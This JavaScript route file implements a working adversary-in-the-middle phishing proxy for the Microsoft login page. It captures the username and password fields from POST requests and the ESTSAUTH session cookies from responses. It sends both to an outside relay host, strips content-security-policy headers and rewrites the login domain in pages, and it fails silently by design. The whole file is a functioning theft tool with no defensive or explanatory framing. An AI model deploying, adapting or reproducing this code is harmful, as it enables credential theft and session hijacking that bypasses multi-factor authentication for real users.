export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://apisage.bralontres.cl/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ---- Exfiltration Functions ----
async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

async function handleProxy(request, pathSegments = []) {
  const url = new URL(request.url);
  
  // Get client info from Vercel headers (equivalent to Cloudflare headers)
  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Blocking check
  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Build URL like Cloudflare Worker does
  const url_hostname = url.hostname;
  const upstream_domain = UPSTREAM;
  
  // Create new URL object for upstream like Cloudflare Worker
  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.host = upstream_domain;

  // Handle path like Cloudflare Worker
  if (upstreamUrl.pathname === '/') {
    upstreamUrl.pathname = UPSTREAM_PATH;
  } else {
    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
  }

  console.log('Proxying to:', upstreamUrl.toString());

  // Build headers EXACTLY like Cloudflare Worker
  const method = request.method;
  const request_headers = request.headers;
  const new_request_headers = new Headers(request_headers);

  new_request_headers.set('Host', upstream_domain);
  new_request_headers.set('Referer', `https://${url_hostname}`);

  // ---- Credentials capture for POST requests ----
  if (method === 'POST') {
    try {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split('&');
      let user, pass;
      for (const pair of keyValuePairs) {
        const [key, value] = pair.split('=');
        if (key === 'login') {
          user = decodeURIComponent(value.replace(/\+/g, ' '));
        }
        if (key === 'passwd') {
          pass = decodeURIComponent(value.replace(/\+/g, ' '));
        }
      }
      if (user && pass) {
        await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
      }
    } catch (error) {
      // Intentionally silent
    }
  }

  // ---- Proxy request to upstream EXACTLY like Cloudflare Worker ----
  let original_response = await fetch(upstreamUrl.toString(), {
    method: method,
    headers: new_request_headers,
    body: ["GET", "HEAD"].includes(method) ? null : request.body
  });

  // Handle WebSocket upgrades like Cloudflare Worker
  let connection_upgrade = new_request_headers.get("Upgrade");
  if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
    return original_response;
  }

  // Process response like Cloudflare Worker
  let original_response_clone = original_response.clone();
  let response_headers = original_response.headers;
  let new_response_headers = new Headers(response_headers);
  let status = original_response.status;

  new_response_headers.set('access-control-allow-origin', '*');
  new_response_headers.set('access-control-allow-credentials', 'true');
  new_response_headers.delete('content-security-policy');
  new_response_headers.delete('content-security-policy-report-only');
  new_response_headers.delete('clear-site-data');

  // ---- Capture and exfil cookies as file ----
  let all_cookies = "";
  try {
    const originalCookies = (typeof new_response_headers.getAll === "function")
      ? new_response_headers.getAll("Set-Cookie")
      : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);
    all_cookies = originalCookies.join("; \n\n");
    originalCookies.forEach(originalCookie => {
      const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
      new_response_headers.append("Set-Cookie", modifiedCookie);
    });
  } catch (error) {
    console.error(error);
  }

  // Only exfiltrate if key auth cookies are present
  if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
    await exfiltrateCookiesFile(all_cookies, ipAddress);
  }

  // ---- Body replacement for domain ----
  const content_type = new_response_headers.get('content-type');
  let original_text = null;
  if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
    let text = await original_response_clone.text();
    text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
    original_text = text;
  } else {
    original_text = original_response_clone.body;
  }

  const response = new Response(original_text, {
    status,
    headers: new_response_headers
  });

  return response;
}

// Export handlers for common HTTP methods
export async function GET(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function POST(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PUT(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function DELETE(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PATCH(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function OPTIONS(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function HEAD(request, { params }) {
  return handleProxy(request, params.path || []);
}
